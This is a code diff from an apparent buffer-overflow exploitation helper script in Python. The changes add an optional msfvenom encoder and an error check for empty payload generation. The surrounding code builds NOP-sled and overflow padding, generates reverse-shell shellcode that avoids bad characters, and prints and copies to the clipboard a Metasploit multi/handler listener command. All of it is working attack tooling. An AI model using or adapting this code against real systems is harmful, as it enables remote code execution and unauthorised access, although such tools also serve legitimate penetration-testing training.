@@ -332,6 +332,10 @@ def direct_exploit():
      
     payload = MSF_payloads(badchars)
     
+    if payload == "":
+        print(RED+ 'An error occured generating the payload. The problem could be too many badchars.\n Try to use x86/alpha_mixed encoder', END)
+        os._exit(1)		
+    
     payload = (payload.encode('utf-8').decode('unicode_escape'))
     padding = "\x90" * 16
     overflow = "A" * offset
@@ -442,15 +446,18 @@ Which payload do you want to generate?\n
     LHOST = lhost_ip()
     global LPORT
     LPORT = input(BLUE+'Give your LPORT= '+END)
+    encoder =  input(BLUE+'Now if you can specify an encoder (e.g. x86/alpha_mixed), otherwise msfvenom will manage it:'+END).strip()
+    if encoder != "": encoder = " -e " + encoder
+    payL = f"msfvenom -p {p_type} LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\"" + encoder + " -f c"
     print("I am using the following command to generate the payload")
-    print(f"msfvenom -p {p_type} LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c")
+    print(payL)
     print("\nMsfVenom payload takes sometime to generate till now you can start your listener on another terminal")
     
     cmd_4_listener = f'msfconsole -q -x "use exploit/multi/handler; set payload {p_type}; set LHOST {LHOST}; set LPORT {LPORT};exploit"'
     print(GREEN+cmd_4_listener,END)
     pyperclip.copy(cmd_4_listener)
     print("I have copied the command in your clipboard too!")
-    return os.popen(f"msfvenom -p {p_type} LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c | grep -oe  '\"[\\\\0-9a-z]*\"' | tr -d '\"' | tr -d \"\\n\"").read()
+    return os.popen(payL + " | grep -oe  '\"[\\\\0-9a-z]*\"' | tr -d '\"' | tr -d \"\\n\"").read()
 
 ###########################################------ CHOOSING LHOST IP ------###########################################
 
